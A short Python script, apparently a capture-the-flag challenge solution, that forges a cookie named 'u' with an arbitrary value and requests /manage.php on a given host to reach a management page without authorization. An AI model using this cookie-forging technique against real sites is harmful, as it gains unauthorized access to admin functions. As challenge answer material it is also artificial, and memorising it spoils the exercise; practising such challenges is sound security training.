# SPDX-License-Identifier: BSD-3-Clause
import requests
import sys

if len(sys.argv) != 3:
    print("Usage: python3 solution.py <HOST|LOCAL> <PORT>")
    sys.exit(1)

HOST = sys.argv[1]
PORT = sys.argv[2]

local = HOST.lower() == "local"

if local:
    URL = f"http://localhost:{PORT}"
else:
    URL = f"https://{HOST}:{PORT}"

s = requests.Session()

# This line is optional. We can set the cookie ourselves if we want.
s.get(URL)

s.cookies.set("u", "hacky mchack")

resp = s.get(f"{URL}/manage.php")
print(resp.text)
